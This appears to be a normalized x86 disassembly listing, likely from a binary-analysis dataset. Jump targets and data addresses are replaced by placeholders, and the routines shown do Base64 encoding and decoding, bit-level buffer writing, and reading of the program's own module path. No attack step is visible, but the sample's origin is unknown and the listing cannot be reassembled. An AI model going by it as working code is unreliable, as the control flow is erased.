sub_401000
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea edx [ eax - 0x1 ]
mov eax 0xaaaaaaab
mul edx
push ebx
shr edx 0x1
inc edx
push edi
lea ebx [ ecx + 0x2 ]
mov edi 0x3
mov [ ebp - 0x4 ] edx
jmp r-xdata
movsx eax [ ecx + edi - 0x3 ]
sar eax 0x2
mov dl [ eax + r--data ]
mov [ esi ] dl
mov cl [ ecx + edi - 0x3 ]
and cl 0x3
lea eax [ edi - 0x1 ]
shl cl 0x4
cmp eax [ ebp + 0xc ]
jae r-xdata
mov [ esi + 0x2 ] 0x3d3d
mov al [ ebx - 0x1 ]
mov dl al
and al 0xf
sar dl 0x4
add al al
or cl dl
add al al
cmp edi [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp + 0x8 ]
pop edi
pop ebx
movzx eax al
mov [ esi + 0x3 ] 0x3d
mov dl [ eax + r--data ]
mov [ esi + 0x2 ] dl
jmp r-xdata
movzx edx [ ebx ]
sar dl 0x6
or al dl
movsx edx [ ebx ]
and edx 0x3f
movzx edx [ edx + r--data ]
movzx eax al
mov [ esi + 0x3 ] dl
mov dl [ eax + r--data ]
mov [ esi + 0x2 ] dl
jmp r-xdata
movzx eax cl
mov cl [ eax + r--data ]
mov [ esi + 0x1 ] cl
add edi 0x3
add ebx 0x3
add esi 0x4
dec [ ebp - 0x4 ]
jne r-xdata
sub_4010e0
lea ecx [ eax - 0x41 ]
cmp cl 0x19
ja r-xdata
lea edx [ eax - 0x61 ]
cmp dl 0x19
ja r-xdata
movsx eax al
sub eax 0x41
retn
lea ecx [ eax - 0x30 ]
cmp cl 0x9
ja r-xdata
movsx eax al
sub eax 0x47
retn
cmp al 0x2b
jne r-xdata
movsx eax al
add eax 0x4
retn
cmp al 0x2f
setne al
dec al
and al 0x3f
retn
mov al 0x3e
retn
sub_401120
push ebp
mov ebp esp
sub esp 0x8
push ebx
xor ebx ebx
push esi
mov esi rwxdata
cmp [ ebp + 0x8 ] ebx
je r-xdata
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi rwxdata
mov edi edi
lea eax [ ecx - 0x61 ]
cmp al 0x19
ja r-xdata
mov cl dl
jmp r-xdata
lea edx [ ecx - 0x30 ]
cmp dl 0x9
ja r-xdata
sub cl 0x47
jmp r-xdata
add cl cl
lea eax [ ecx + ecx ]
mov cl [ edi - 0x1 ]
lea edx [ ecx - 0x41 ]
cmp dl 0x19
jbe r-xdata
cmp cl 0x2b
jne r-xdata
add cl 0x4
jmp r-xdata
mov cl dl
sar cl 0x4
or al cl
mov cl [ edi ]
mov [ ebp - 0x1 ] al
cmp cl 0x3d
je r-xdata
lea edx [ ecx - 0x61 ]
cmp dl 0x19
ja r-xdata
cmp cl 0x2f
setne cl
dec cl
and cl 0x3f
mov cl 0x3e
jmp r-xdata
sub ebx 0x2
xor dl dl
xor al al
shl dl 0x4
lea ebx [ ecx - 0x41 ]
mov al dl
cmp bl 0x19
ja r-xdata
lea edx [ ecx - 0x30 ]
cmp dl 0x9
ja r-xdata
sub cl 0x47
mov dl cl
jmp r-xdata
mov cl [ edi - 0x2 ]
dec [ ebp + 0x8 ]
add ebx 0x3
mov [ ebp - 0x8 ] ebx
lea edx [ ecx - 0x41 ]
cmp dl 0x19
ja r-xdata
pop edi
lea edx [ ecx - 0x61 ]
cmp dl 0x19
ja r-xdata
mov cl bl
jmp r-xdata
cmp cl 0x2b
jne r-xdata
add cl 0x4
mov dl cl
jmp r-xdata
lea edx [ ecx - 0x30 ]
cmp dl 0x9
ja r-xdata
sub cl 0x47
jmp r-xdata
mov bl [ edi + 0x1 ]
mov dl cl
sar dl 0x2
or al dl
cmp bl 0x3d
je r-xdata
cmp cl 0x2f
setne dl
dec dl
and dl 0x3f
mov dl 0x3e
jmp r-xdata
cmp cl 0x2b
jne r-xdata
add cl 0x4
jmp r-xdata
dec [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor dl dl
jmp r-xdata
shl cl 0x6
mov dl cl
lea ecx [ ebx - 0x41 ]
cmp cl 0x19
ja r-xdata
cmp cl 0x2f
setne cl
dec cl
and cl 0x3f
mov cl 0x3e
jmp r-xdata
mov [ ebp + 0x8 ] 0x0
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
ja r-xdata
mov bl cl
or dl bl
mov ebx [ ebp - 0x8 ]
jmp r-xdata
lea ecx [ ebx - 0x30 ]
cmp cl 0x9
ja r-xdata
sub bl 0x47
or dl bl
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov cl [ ebp - 0x1 ]
mov [ esi ] cl
mov [ esi + 0x1 ] al
mov [ esi + 0x2 ] dl
add esi 0x3
add edi 0x4
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp bl 0x2b
jne r-xdata
add bl 0x4
or dl bl
mov ebx [ ebp - 0x8 ]
jmp r-xdata
cmp bl 0x2f
setne bl
dec bl
and bl 0x3f
or dl bl
mov ebx [ ebp - 0x8 ]
jmp r-xdata
mov bl 0x3e
or dl bl
mov ebx [ ebp - 0x8 ]
jmp r-xdata
sub_4012c0
mov eax ebx
and eax 0x80
xor dl dl
cmp al 0x80
mov eax [ rwxdata ]
mov ecx 0x1
jne r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x40
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x20
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
mov [ rwxdata ] eax
retn
mov [ eax + rwxdata ] cl
add eax ecx
mov [ rwxdata ] eax
retn
add eax ecx
test cl bl
je r-xdata
sub_401390
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax 0x3
jne r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ rwxdata ]
mov ecx 0x1
mov [ eax + rwxdata ] cl
add eax ecx
xor dl dl
test bl 0x4
je r-xdata
cmp eax 0x5
jne r-xdata
mov eax [ rwxdata ]
xor dl dl
mov ecx 0x1
cmp ebx 0x7
jbe r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ rwxdata ]
xor dl dl
mov ecx 0x1
cmp ebx 0x7
jbe r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] cl
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
cmp eax 0x7
jne r-xdata
mov eax [ rwxdata ]
xor dl dl
mov ecx 0x1
cmp ebx 0x7
jbe r-xdata
mov [ eax + rwxdata ] cl
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0x4
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0x4
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
cmp eax 0x8
jne r-xdata
mov eax [ rwxdata ]
xor dl dl
mov ecx 0x1
cmp ebx 0x7
jbe r-xdata
mov [ eax + rwxdata ] cl
add eax ecx
test bl 0x20
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
cmp eax 0x9
jne r-xdata
mov eax [ rwxdata ]
xor dl dl
mov ecx 0x1
cmp ebx 0x7
jbe r-xdata
mov [ eax + rwxdata ] cl
add eax ecx
test bl 0x40
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
pop ebx
pop ebp
retn
mov eax [ rwxdata ]
xor dl dl
mov ecx 0x1
cmp ebx 0x7
ja r-xdata
mov [ eax + rwxdata ] cl
and ebx 0x80
add eax ecx
cmp bl 0x80
jne r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0x5
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0x5
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
mov [ eax + rwxdata ] cl
add eax ecx
test ebx 0x100
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x20
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov bl [ ebp + 0x8 ]
add eax ecx
test bl 0x40
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0x6
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0x6
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov ebx [ ebp + 0x8 ]
and ebx 0x80
add eax ecx
cmp bl 0x80
jne r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x20
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
mov bl [ ebp + 0x8 ]
add eax ecx
test bl 0x40
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0x7
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0x7
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x20
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x10
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0x8
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0x8
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x8
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x4
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0x9
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0x9
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
mov [ eax + rwxdata ] dl
mov [ eax + rwxdata ] cl
jmp r-xdata
add eax ecx
test bl 0x2
je r-xdata
mov [ eax + rwxdata ] dl
add eax ecx
add [ rwxdata ] 0xa
mov [ rwxdata ] eax
mov [ eax + rwxdata ] cl
add eax ecx
add [ rwxdata ] 0xa
mov [ rwxdata ] eax
pop ebx
pop ebp
retn
add eax ecx
test cl bl
je r-xdata
sub_401910
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax 0x3
mov ebx 0x1
test eax eax
jne r-xdata
sub eax ebx
jns r-xdata
cmp eax ebx
jne r-xdata
mov edi [ rwxdata ]
mov esi [ rwxdata ]
test edi edi
jle r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ eax + 0x4 ]
sar edx cl
test bl dl
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x2
jne r-xdata
mov edi [ rwxdata ]
mov esi [ rwxdata ]
test edi edi
jle r-xdata
mov al [ ebp + 0x8 ]
test al 0x8
je r-xdata
push edi
lea eax [ esi + rwxdata ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
add esi edi
add [ rwxdata ] edi
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ rwxdata ]
mov esi [ rwxdata ]
test edi edi
jle r-xdata
cmp eax 0x3
jne r-xdata
mov edi [ rwxdata ]
mov esi [ rwxdata ]
test edi edi
jle r-xdata
mov al [ ebp + 0x8 ]
test al 0x10
je r-xdata
push edi
lea eax [ esi + rwxdata ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
add esi edi
add [ rwxdata ] edi
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
mov al [ ebp + 0x8 ]
test al 0x8
je r-xdata
push edi
lea eax [ esi + rwxdata ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
add esi edi
add [ rwxdata ] edi
mov edi [ rwxdata ]
mov esi [ rwxdata ]
test edi edi
jle r-xdata
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
push edi
lea eax [ esi + rwxdata ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
add esi edi
add [ rwxdata ] edi
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x4
je r-xdata
mov [ esi + rwxdata ] bl
jmp r-xdata
mov al [ ebp + 0x8 ]
test al 0x40
je r-xdata
push edi
lea eax [ esi + rwxdata ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
add esi edi
add [ rwxdata ] edi
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x8
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x2
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x10
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x4
je r-xdata
mov [ esi + rwxdata ] 0x0
add esi ebx
add [ rwxdata ] 0x4
mov [ rwxdata ] esi
mov [ esi + rwxdata ] bl
add esi ebx
add [ rwxdata ] 0x4
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
add esi ebx
test bl al
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x20
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x8
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x2
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x10
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x4
je r-xdata
mov [ esi + rwxdata ] 0x0
add esi ebx
add [ rwxdata ] 0x5
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
mov [ esi + rwxdata ] bl
add esi ebx
add [ rwxdata ] 0x5
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
add esi ebx
test bl al
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x8
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x2
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x4
je r-xdata
mov [ esi + rwxdata ] 0x0
add esi ebx
add [ rwxdata ] 0x6
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
mov [ esi + rwxdata ] bl
add esi ebx
add [ rwxdata ] 0x6
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
add esi ebx
test bl al
je r-xdata
mov [ esi + rwxdata ] 0x0
mov [ esi + rwxdata ] bl
jmp r-xdata
add esi ebx
test al 0x2
je r-xdata
mov [ esi + rwxdata ] 0x0
add esi ebx
add [ rwxdata ] 0x7
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
mov [ esi + rwxdata ] bl
add esi ebx
add [ rwxdata ] 0x7
pop edi
mov [ rwxdata ] esi
pop esi
pop ebx
pop ebp
retn
add esi ebx
test bl al
je r-xdata
sub_401cc0
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rwxdata ]
push ebx
xor ebx ebx
push esi
mov esi [ ebp - 0x14 ]
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] 0xfa0
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov [ rwxdata ] ebx
mov eax rwxdata
jmp r-xdata
mov edi 0x10
jmp r-xdata
mov edx 0x10
mov [ eax - 0x4 ] ebx
mov [ eax ] ebx
add eax 0x8
dec ecx
jne r-xdata
dec edx
jne r-xdata
mov ecx 0x10
lea ebx [ ebx ]
dec edi
jne r-xdata
cmp eax rwxdata
jl r-xdata
push 0x104
push rwxdata
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
push r--data
push rwxdata
call sub_405ba3
mov ecx [ ebp + 0x8 ]
add esp 0x8
mov [ rwxdata ] eax
cmp ecx ebx
je r-xdata
push eax
mov [ rwxdata ] ebx
call sub_4062a6
mov ecx eax
sar ecx 0x4
and ecx 0xf
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov edx eax
mov [ ecx * 4 + rwxdata ] eax
mov eax [ rwxdata ]
and edx 0xf
inc ecx
push eax
mov [ ebp - 0x18 ] 0x1
mov [ rwxdata ] edx
mov edi 0x2
mov [ rwxdata ] ecx
call sub_405a5c
add esp 0x8
test eax eax
jne r-xdata
push ebx
push ecx
push eax
call sub_406055
mov eax [ rwxdata ]
add esp 0xc
mov ecx [ rwxdata ]
push ecx
call sub_405a5c
add esp 0x4
test eax eax
jne r-xdata
or ebx 0xffffffff
lea esp [ esp ]
mov [ ebp - 0x28 ] 0xffffffff
mov edx [ rwxdata ]
push edx
call sub_405f66
add esp 0x4
mov [ ebp - 0x28 ] eax
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ rwxdata ]
push eax
call sub_40613e
add esp 0x4
or eax 0xffffffff
mov ecx 0xfa0
mov edi rwxdata
[ edi ]
mov [ ebp - 0x20 ] 0x0
mov eax rwxdata
jmp r-xdata
mov eax [ rwxdata ]
push eax
call sub_4062a6
inc [ ebp - 0x18 ]
mov ecx eax
sar ecx 0x4
and ecx 0xf
mov [ edi * 4 + rwxdata ] ecx
mov ecx [ rwxdata ]
mov edx eax
mov [ ecx * 4 + rwxdata ] eax
mov eax [ rwxdata ]
and edx 0xf
inc ecx
mov [ edi * 4 + rwxdata ] edx
push eax
inc ebx
add edi 0x2
mov [ rwxdata ] ecx
call sub_405a5c
add esp 0x8
test eax eax
je r-xdata
mov eax [ rwxdata ]
shl eax 0x4
add eax [ rwxdata ]
xor edi edi
shl eax 0x4
add eax [ rwxdata ]
shl eax 0x4
add eax [ rwxdata ]
add eax eax
add eax eax
mov ecx [ eax + eax + rwxdata ]
add eax eax
test ecx ecx
jne r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp - 0x24 ]
cmp [ ebp - 0x18 ] ecx
jge r-xdata
mov edx [ eax + rwxdata ]
imul edx edx 0x7d0
add edx ecx
inc ecx
mov [ edx * 4 + rwxdata ] ebx
mov [ eax + rwxdata ] ecx
mov ecx [ rwxdata ]
mov esi ecx
imul esi esi 0x7d0
mov [ eax + rwxdata ] ecx
mov edx [ eax + rwxdata ]
add esi edx
inc ecx
inc edx
mov [ esi * 4 + rwxdata ] ebx
mov esi [ ebp - 0x14 ]
mov [ rwxdata ] ecx
mov [ eax + rwxdata ] edx
jmp r-xdata
cmp [ edi ] 0x2
jl r-xdata
inc ebx
add edi 0x8
cmp ebx 0x10
jl r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
and eax 0xf
shl eax 0x4
and ecx 0xf
or eax ecx
mov ecx [ rwxdata ]
shl eax 0x4
and edx 0xf
or eax edx
shl eax 0x4
or eax ebx
mov [ ebp - 0x10 ] eax
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x14 ]
inc ecx
mov [ ebp - 0x14 ] ecx
mov eax edi
cmp ecx 0x10
jl r-xdata
xor edx edx
test ecx ecx
jle r-xdata
mov [ rwxdata ] eax
xor esi esi
mov [ rwxdata ] 0x1
jmp r-xdata
xor ebx ebx
mov edi eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
mov [ ebp - 0x1c ] ecx
cmp ecx 0x10
jl r-xdata
cmp edx ecx
jne r-xdata
cmp [ edx * 4 + rwxdata ] eax
je r-xdata
cmp [ edi ] 0x1
jle r-xdata
inc [ ebp - 0x20 ]
cmp eax rwxdata
jl r-xdata
mov [ ecx * 4 + rwxdata ] eax
mov esi ecx
inc ecx
mov [ rwxdata ] ecx
mov esi edx
inc edx
cmp edx ecx
jl r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
imul eax eax 0x1f40
add eax rwxdata
dec ecx
lea esp [ esp ]
mov eax [ rwxdata ]
mov [ ebp - 0x14 ] esi
cmp eax 0xc8
jl r-xdata
jmp r-xdata
mov edx [ eax ]
add eax 0x4
dec ecx
mov [ edx * 4 + rwxdata ] esi
jne r-xdata
xor ecx ecx
or edx 0xffffffff
mov [ ebp - 0x14 ] ecx
xor edi edi
mov ebx ecx
mov esi ecx
jmp r-xdata
cmp eax 0x100
jl r-xdata
mov eax [ edi * 4 + rwxdata ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x2c ]
sub [ ebp - 0x24 ] 0x1f4
mov [ rwxdata ] eax
xor ebx ebx
jmp r-xdata
inc edi
cmp edi 0xfa0
jl r-xdata
cmp edx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp edx eax
jge r-xdata
mov ecx edi
sub ecx edx
sub ecx 0x2
cmp [ ebp - 0x14 ] ecx
jge r-xdata
cmp ecx edi
jge r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
cmp eax ecx
jl r-xdata
sub eax edx
sub eax 0x2
cmp ecx eax
jge r-xdata
test eax eax
js r-xdata
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x14 ] edi
jmp r-xdata
mov al [ ebp + 0x8 ]
mov cl [ ebp + 0x8 ]
cmp eax ebx
jl r-xdata
mov [ ebp - 0x14 ] eax
cmp eax 0x10
jl r-xdata
cmp eax 0x10
jge r-xdata
mov edi [ ebp - 0x4 ]
cmp edx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
cmp eax edx
jl r-xdata
cmp eax 0x20
jl r-xdata
cmp eax 0x20
jge r-xdata
inc [ ebp - 0x8 ]
cmp edi [ ebp - 0x8 ]
jl r-xdata
cmp ebx edx
jl r-xdata
mov edi [ ebp - 0x4 ]
cmp edx edi
jl r-xdata
cmp eax esi
jl r-xdata
cmp eax 0x40
jl r-xdata
cmp eax 0x40
jge r-xdata
inc [ ebp - 0xc ]
cmp esi [ ebp - 0x8 ]
jl r-xdata
mov edx [ ebp - 0xc ]
cmp edi edx
jl r-xdata
cmp ebx edi
jl r-xdata
cmp ebx [ ebp - 0x8 ]
jl r-xdata
cmp edx esi
jl r-xdata
mov eax 0x4
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
cmp ecx ebx
jl r-xdata
cmp eax 0x80
jl r-xdata
cmp eax 0x80
jge r-xdata
inc ebx
mov esi [ ebp - 0x14 ]
test esi esi
js r-xdata
mov edx [ ebp - 0xc ]
cmp esi edx
jl r-xdata
cmp edi ebx
jl r-xdata
cmp ebx esi
jl r-xdata
xor eax eax
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
cmp ebx [ ebp - 0x8 ]
jl r-xdata
mov cl [ ebp + 0x8 ]
cmp ecx edx
jl r-xdata
mov ecx [ ebp - 0x14 ]
mov edx edi
cmp eax 0x100
jge r-xdata
inc [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
cmp esi 0x8
jge r-xdata
cmp esi ebx
jl r-xdata
cmp edi esi
jl r-xdata
mov eax 0x1
mov [ rwxdata ] al
mov [ rwxdata ] eax
cmp edi [ ebp - 0x8 ]
jl r-xdata
mov edx 0x4
cmp ebx edi
jl r-xdata
cmp edx edi
jl r-xdata
cmp ebx edx
jl r-xdata
cmp ecx esi
jl r-xdata
inc esi
cmp esi 0x10
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov edx 0x3
jmp r-xdata
cmp esi edi
jl r-xdata
mov edi [ ebp - 0x8 ]
mov eax 0x2
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
cmp ebx edx
jg r-xdata
mov edx 0x4
cmp edi [ ebp - 0xc ]
jl r-xdata
cmp esi edi
jl r-xdata
cmp edi [ ebp - 0x8 ]
jl r-xdata
cmp ebx esi
jl r-xdata
cmp esi edi
jl r-xdata
cmp edx ebx
jl r-xdata
cmp ebx esi
jl r-xdata
xor ecx ecx
mov [ rwxdata ] 0x2
mov [ rwxdata ] 0x100
mov [ rwxdata ] 0x3
mov [ rwxdata ] cx
mov [ rwxdata ] 0x1
mov [ rwxdata ] eax
mov [ rwxdata ] rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
jmp r-xdata
cmp esi 0x20
jl r-xdata
cmp esi 0x20
jge r-xdata
cmp esi 0x10
jge r-xdata
mov [ ebp - 0x10 ] 0x4
mov edx [ ebp - 0x10 ]
cmp esi 0x8
jl r-xdata
mov eax 0x3
mov [ rwxdata ] 0x1
mov [ rwxdata ] 0x1
cmp edx ebx
jl r-xdata
cmp ebx edi
